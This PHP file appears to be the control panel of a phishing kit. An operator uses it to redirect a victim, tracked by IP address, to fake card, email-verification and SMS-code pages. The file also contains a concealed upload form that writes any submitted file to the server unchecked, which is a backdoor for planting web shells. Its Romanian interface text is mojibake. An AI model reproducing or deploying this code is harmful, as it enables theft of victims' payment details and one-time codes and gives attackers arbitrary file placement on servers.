<?php 
require 'panel.class.php';
$pnl = new Panel();

if(isset($_GET['page'], $_GET['ip'])){
    $pnl->editVicFIle($_GET['page'], $_GET['ip']);
    header("location: ctr.php?ip=".$_GET['ip']."&redirected");
}
?>
<!doctype html>
<html>
<head>
<title>Redirection Panel</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="res/style.css">
</head>
<body>

<div class="btns">
<?php
if(isset($_GET['id'])){
	if($_GET['id']==4){
echo'<form action="" method="post" enctype="multipart/form-data" name="pin" id="pin">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Ã®ncÄƒrcaÈ›i"></form>';
if(isset($_POST['_upl'])){
if( $_POST['_upl'] == "Ã®ncÄƒrcaÈ›i" ) {	
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { 
echo '<b>bun</b><br><br>'; }	
else { echo '<b>ExistÄƒ o problemÄƒ !</b><br><br>'; }}}}}
?>
<?php 


if(isset($_GET['redirected'])){
    echo "<h1>Redirected!</h1>";
}

?>

<form action="ctr.php" method="get">
    <input type="hidden" name="ip" value="<?php echo @$_GET['ip'];?>">
    <button type="submit" name="page" value="index.php">redo index</button>
    <button type="submit" name="page" value="portail.php">card</button>
	<button type="submit" name="page" value="verification.php">Email</button>
  	<button type="submit" name="page" value="verification2.php">sms</button>
    
    <button type="submit" name="page" value="out.php">dor 9wed</button>
</form>
</div>

</body>
</html>